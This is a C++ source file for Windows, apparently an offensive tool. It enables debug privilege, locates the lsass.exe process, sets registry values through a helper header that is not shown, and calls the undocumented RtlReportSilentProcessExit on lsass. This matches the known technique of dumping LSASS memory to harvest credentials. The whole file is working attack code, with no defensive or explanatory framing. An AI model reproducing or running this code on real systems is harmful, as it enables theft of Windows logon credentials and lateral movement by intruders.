#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include "ExitProcess.h"

typedef NTSTATUS(NTAPI* pRtlReportSilentProcessExit)(
	HANDLE ProcessHandle,
	NTSTATUS ExitStatus
	);

BOOL EnableDebug(BOOL bEnable) {
	HANDLE hToken = nullptr;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) return FALSE; //尝试获取调试权限，并将权限转换为luid

	TOKEN_PRIVILEGES tokenPriv;
	tokenPriv.PrivilegeCount = 1;
	tokenPriv.Privileges[0].Luid = luid;
	tokenPriv.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	if(!AdjustTokenPrivileges(hToken,FALSE,&tokenPriv,sizeof(TOKEN_PRIVILEGES),NULL,NULL))return FALSE;
	
	return TRUE;
}

DWORD GetProcessID(const char* processName) {
	DWORD pid = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshot == INVALID_HANDLE_VALUE) {
		std::cout << "[-]ERROR: Failed to get snapshot.\n";
		return -3;
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(processEntry);
	if (Process32First(snapshot, &processEntry)) {
		do {
			if (_stricmp(processName, processEntry.szExeFile) == 0) {
				pid = processEntry.th32ProcessID;
				break;
			}
		} while (Process32Next(snapshot, &processEntry));
	}
	CloseHandle(snapshot);
	return pid;
}

int main() {

	if (!EnableDebug(TRUE)) {
		std::cout << "[-]ERROR: Failed to enable debug privilege.\n";
		return -1;
	}

	DWORD pid = GetProcessID("lsass.exe");
	std::cout << "[+]Found ls pid: " << pid << std::endl;

	RegSet regSet("lsass.exe");
	if (!regSet.isValid()) {
		std::cout << "[-]ERROR: Failed to set Reg.\n";
		return -2;
	}

	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
	pRtlReportSilentProcessExit RtlReportSilentProcessExit = (pRtlReportSilentProcessExit)GetProcAddress(hNtdll, "RtlReportSilentProcessExit");

	DWORD desiredAccess;
	desiredAccess = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;

	HANDLE hProcess = OpenProcess(desiredAccess, FALSE, pid);

	if (hProcess == INVALID_HANDLE_VALUE) {
		std::cout << "[-]ERROR: Failed to Open Process,error code: " << GetLastError() << std::endl;
		return -4;
	}

	NTSTATUS status = RtlReportSilentProcessExit(hProcess, 0);
	if (status >= 0) std::cout << "[*]SUCCESS\n";

	return 0;
}